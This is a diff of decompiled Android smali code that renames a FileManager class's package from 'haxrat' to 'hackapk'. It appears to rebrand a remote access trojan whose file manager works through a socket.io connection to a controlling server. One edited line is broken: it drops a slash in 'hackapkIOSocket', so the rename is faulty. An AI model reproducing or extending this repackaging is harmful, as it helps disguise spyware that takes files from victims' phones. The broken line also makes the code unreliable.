@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/FileManager;
+.class public Lcom/justhack/hackapk/FileManager;
 .super Ljava/lang/Object;
 .source "FileManager.java"
 
@@ -175,11 +175,11 @@
     move-result-object v8
 
     .line 80
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v8
 
-    invoke-virtual {v8}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v8}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v8
 
@@ -346,11 +346,11 @@
     move-result-object v11
 
     .line 31
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapkIOSocket;
 
     move-result-object v11
 
-    invoke-virtual {v11}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v11}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v11
 
